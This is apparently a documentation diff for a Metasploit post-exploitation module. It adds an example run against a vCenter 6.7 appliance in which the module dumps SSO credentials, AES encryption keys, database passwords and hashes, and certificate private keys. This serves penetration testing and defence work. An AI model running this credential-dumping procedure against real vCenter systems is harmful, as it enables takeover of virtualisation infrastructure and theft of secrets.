@@ -274,3 +274,79 @@ msf6 post(linux/gather/vcenter_secrets_dump) > dump
 [+]     AD User: sam@cesium137.io
 [+]     AD Pass: Gr33n3gg$!
 [*] Post module execution completed
+```
+
+Example run from meterpreter session on vCenter appliance version 6.7 build-18831049
+
+```
+msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
+msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
+session => 1
+msf6 post(linux/gather/vcenter_secrets_dump) > run
+[*] VMware VirtualCenter 6.7.0 build-18831049
+[*] vCenter Appliance (Embedded)
+[*] Validating target
+[*] Appliance IPv4: 2.2.2.2
+[*] Appliance Hostname: photon-machine.ragedomain
+[*] Appliance OS: VMware Photon Linux 1.0-62c543d
+[*] Gathering vSphere SSO domain information
+[+] vSphere SSO DC DN: cn=photon-machine.ragedomain,ou=Domain Controllers,dc=vsphere,dc=local
+[+] vSphere SSO DC PW: )sM8M]h,YZBQ:kY['h^(
+[*] Extracting tenant and vpx AES encryption key...
+[+] vSphere Tenant AES encryption
+[+]     KEY: ]E6"Jg7V}d{!Q:Lh
+[+]     HEX: 5d4536224a6737567d647b21513a4c68
+[+] vSphere vmware-vpx AES encryption
+[+]     HEX: ac20416a5850df52f1bf889440995871ba52984a893dbe44fd71c5c768aea3be
+[*] Extracting PostgreSQL database credentials
+[+]     VCDB Name: VCDB
+[+]     VCDB User: vc
+[+]     VCDB Pass: MB&|<)haN6Q>{K3O
+[*] Checking for VPX Users
+[-] No VPXUSER entries were found
+[*] Extract ESXi host vpxuser credentials
+[!] No ESXi hosts attached to this vCenter system
+[*] Extracting vSphere SSO domain secrets
+[*] Dumping vmdir schema to LDIF and storing to loot...
+[!] Unable to retrieve ldif contents
+WARNING:  there is already a transaction in progress
+[-] Error processing LDIF file
+[*] Extracting certificates from vSphere platform
+[+] VMCA_ROOT key: /root/.msf4/loot/20221102165124_default_2.2.2.2_vmca_523828.key
+[+] VMCA_ROOT cert: /root/.msf4/loot/20221102165124_default_2.2.2.2_vmca_694934.pem
+[+] SSO_STS_IDP key: /root/.msf4/loot/20221102165125_default_2.2.2.2_idp_031902.key
+[+] SSO_STS_IDP cert: /root/.msf4/loot/20221102165125_default_2.2.2.2_idp_256763.pem
+[+] MACHINE_SSL_CERT Key: /root/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_448485.key
+[+] MACHINE_SSL_CERT Cert: /root/.msf4/loot/20221102165126_default_2.2.2.2___MACHINE_CERT_793765.pem
+[+] MACHINE Key: /root/.msf4/loot/20221102165127_default_2.2.2.2_machine_336860.key
+[+] MACHINE Cert: /root/.msf4/loot/20221102165127_default_2.2.2.2_machine_588424.pem
+[+] VSPHERE-WEBCLIENT Key: /root/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_567378.key
+[+] VSPHERE-WEBCLIENT Cert: /root/.msf4/loot/20221102165127_default_2.2.2.2_vspherewebclien_997605.pem
+[+] VPXD Key: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_521342.key
+[+] VPXD Cert: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxd_415704.pem
+[+] VPXD-EXTENSION Key: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_152066.key
+[+] VPXD-EXTENSION Cert: /root/.msf4/loot/20221102165128_default_2.2.2.2_vpxdextension_359784.pem
+[+] DATA-ENCIPHERMENT Key: /root/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_517854.key
+[+] DATA-ENCIPHERMENT Cert: /root/.msf4/loot/20221102165129_default_2.2.2.2_dataenciphermen_408460.pem
+[+] SMS Key: /root/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_777691.key
+[+] SMS Cert: /root/.msf4/loot/20221102165130_default_2.2.2.2_sms_self_signed_215695.pem
+[*] Searching for secrets in VM Guest Customization Specification XML
+[!] No vpx_customization_spec entries evident
+[*] Retrieving .pgpass file
+[+] .pgpass creds found: replicator, BN^qgk&a)Ee2dK@| for localhost:replication
+[+] .pgpass creds found: replicator, BN^qgk&a)Ee2dK@| for 127.0.0.1:replication
+[+] .pgpass creds found: replicator, BN^qgk&a)Ee2dK@| for /var/run/vpostgres:replication
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for localhost:postgres
+[+] posgres database creds found: postgres, md5fdb13b980a01e3d1ae99b5b55b6e4303
+[+] posgres database creds found: replicator, md5c2a01981014a380b63c0c7c66ad77ba9
+[+] posgres database creds found: vc, md53b5a9fc0dd6c99567e9ca27c459b43d9
+[+] posgres database creds found: vumuser, md5fc719b1b56f02981027379fd15125feb
+[+] posgres database creds found: cns, md5d92e4534c059354dee12a7cc9a79faff
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for 127.0.0.1:postgres
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for localhost:VCDB
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for 127.0.0.1:VCDB
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for /var/run/vpostgres:VCDB
+[+] .pgpass creds found: postgres, i23rYg+oPBQwpn!5 for /var/run/vpostgres:postgres
+[+] Saving the /root/.pgpass contents to /root/.msf4/loot/20221102165131_default_2.2.2.2_.pgpass_509065.txt
+[*] Post module execution completed
+```
